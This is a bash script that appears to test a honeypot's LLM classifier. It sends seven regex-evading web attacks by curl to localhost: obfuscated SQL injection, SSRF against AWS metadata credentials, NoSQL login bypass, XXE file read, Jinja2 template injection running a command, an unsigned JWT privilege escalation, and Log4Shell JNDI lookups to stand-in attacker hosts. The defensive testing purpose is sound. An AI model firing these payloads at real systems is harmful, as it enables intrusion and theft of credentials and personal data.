#!/bin/bash
# ============================================================================
# Rule-Bypass Attack Suite — Attacks crafted to evade regex rules
# but get caught by the LLM classifier via semantic analysis
# ============================================================================

HONEYPOT="http://localhost:8080"
GREEN='\033[0;32m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m'

echo ""
echo -e "${RED}╔══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║     RULE-BYPASS ATTACK SUITE — LLM-Only Detection Test     ║${NC}"
echo -e "${RED}╚══════════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${YELLOW}These attacks are designed to BYPASS all regex rules but${NC}"
echo -e "${YELLOW}should be CAUGHT by the AI/LLM semantic classifier.${NC}"
echo ""
sleep 1

# ──────────────────────────────────────────────────────────────
# 1. OBFUSCATED SQL INJECTION — Unicode + case mixing tricks
#    Rules look for: SELECT...FROM, UNION SELECT, 'OR 1=1, etc.
#    Evasion: uses comment injection, hex encoding, string concat
# ──────────────────────────────────────────────────────────────
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${RED}[1/7] OBFUSCATED SQL INJECTION — Comment-stuffed query${NC}"
echo -e "${CYAN}Evasion: SQL keywords split by inline comments /**/ bypass regex${NC}"
echo ""
curl -s -X POST "$HONEYPOT/api/v2/products/search" \
  -H "Content-Type: application/json" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
  -d '{"query": "laptop", "category": "electronics", "filter": "price/**/UNI0N/**/SELE CT/**/1,2,table_name/**/FR0M/**/inf0rmation_schema.tables"}' | python3 -m json.tool 2>/dev/null || echo "(raw response above)"
echo ""
sleep 2

# ──────────────────────────────────────────────────────────────
# 2. SSRF — Server-Side Request Forgery  
#    Rules: NO specific SSRF rules exist in the rule engine!
#    The LLM knows about cloud metadata endpoints semantically
# ──────────────────────────────────────────────────────────────
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${RED}[2/7] SSRF — AWS Metadata Credential Theft${NC}"
echo -e "${CYAN}Evasion: No SSRF rules exist — only LLM can recognize this pattern${NC}"
echo ""
curl -s -X POST "$HONEYPOT/api/v2/webhook/validate" \
  -H "Content-Type: application/json" \
  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)" \
  -d '{"webhook_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role", "events": ["order.completed"]}' | python3 -m json.tool 2>/dev/null || echo "(raw response above)"
echo ""
sleep 2

# ──────────────────────────────────────────────────────────────
# 3. NoSQL INJECTION — MongoDB operator injection
#    Rules: All SQL rules look for SQL syntax (SELECT, UNION, etc.)
#    MongoDB $ne, $gt operators are completely invisible to them
# ──────────────────────────────────────────────────────────────
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${RED}[3/7] NoSQL INJECTION — MongoDB Operator Bypass${NC}"
echo -e "${CYAN}Evasion: SQL rules cant match MongoDB operators like \$ne, \$gt${NC}"
echo ""
curl -s -X POST "$HONEYPOT/api/v2/auth/login" \
  -H "Content-Type: application/json" \
  -H "User-Agent: PostmanRuntime/7.32.3" \
  -d '{"username": {"$ne": ""}, "password": {"$gt": ""}, "remember_me": true}' | python3 -m json.tool 2>/dev/null || echo "(raw response above)"
echo ""
sleep 2

# ──────────────────────────────────────────────────────────────
# 4. XXE — XML External Entity Injection
#    Rules: No XXE-specific patterns in the rule engine
#    LLM understands DOCTYPE/ENTITY patterns semantically
# ──────────────────────────────────────────────────────────────
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${RED}[4/7] XXE — XML External Entity File Read${NC}"
echo -e "${CYAN}Evasion: No XXE rules exist — LLM recognizes DOCTYPE/ENTITY patterns${NC}"
echo ""
curl -s -X POST "$HONEYPOT/api/v2/import/xml" \
  -H "Content-Type: application/xml" \
  -H "User-Agent: Java/11.0.15" \
  -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><order><item>&xxe;</item><quantity>1</quantity></order>' | python3 -m json.tool 2>/dev/null || echo "(raw response above)"
echo ""
sleep 2

# ──────────────────────────────────────────────────────────────
# 5. SSTI — Server-Side Template Injection
#    Rules: No SSTI patterns ({{, {%, etc.) in the rule engine
#    LLM knows Jinja2/Twig template injection syntax
# ──────────────────────────────────────────────────────────────
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${RED}[5/7] SSTI — Server-Side Template Injection (Jinja2)${NC}"
echo -e "${CYAN}Evasion: No template injection rules — LLM detects {{...}} RCE patterns${NC}"
echo ""
curl -s -X POST "$HONEYPOT/api/v2/profile/update" \
  -H "Content-Type: application/json" \
  -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0)" \
  -d '{"display_name": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"id\").read()}}", "bio": "Just a normal user profile update"}' | python3 -m json.tool 2>/dev/null || echo "(raw response above)"
echo ""
sleep 2

# ──────────────────────────────────────────────────────────────
# 6. IDOR with JWT Tampering — Subtle access control bypass
#    Rules: Only looks for obvious admin=1 or /api/admin
#    This one modifies JWT claims to escalate privilege
# ──────────────────────────────────────────────────────────────
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${RED}[6/7] IDOR + JWT TAMPERING — Privilege Escalation${NC}"
echo -e "${CYAN}Evasion: Modified JWT with role=admin in payload, not in simple params${NC}"
echo ""
curl -s -X GET "$HONEYPOT/api/v2/users/1/billing?include=ssn,credit_card,bank_account" \
  -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiMSIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTcxOTAwMDAwMH0." \
  -H "X-Forwarded-For: 10.0.0.1" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" | python3 -m json.tool 2>/dev/null || echo "(raw response above)"
echo ""
sleep 2

# ──────────────────────────────────────────────────────────────
# 7. LOG4SHELL / JNDI — Java deserialization RCE
#    Rules: No JNDI/Log4j patterns exist in rule engine
#    LLM recognizes ${jndi:ldap://...} as critical RCE
# ──────────────────────────────────────────────────────────────
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${RED}[7/7] LOG4SHELL / JNDI — Remote Code Execution${NC}"
echo -e "${CYAN}Evasion: No JNDI/Log4j rules — LLM recognizes JNDI lookup as critical RCE${NC}"
echo ""
curl -s -X GET "$HONEYPOT/api/v2/search?q=test" \
  -H "X-Api-Version: \${jndi:ldap://attacker.evil.com:1389/Exploit}" \
  -H "User-Agent: \${jndi:ldap://c2.attacker.com/payload}" \
  -H "Referer: \${jndi:rmi://evil.com/exec}" | python3 -m json.tool 2>/dev/null || echo "(raw response above)"
echo ""

echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${GREEN}All 7 evasion attacks sent!${NC}"
echo -e "${YELLOW}Wait 30-60s for the LLM classifier to process the queue...${NC}"
echo -e "${YELLOW}Then check the dashboard at http://localhost:3000${NC}"
echo ""
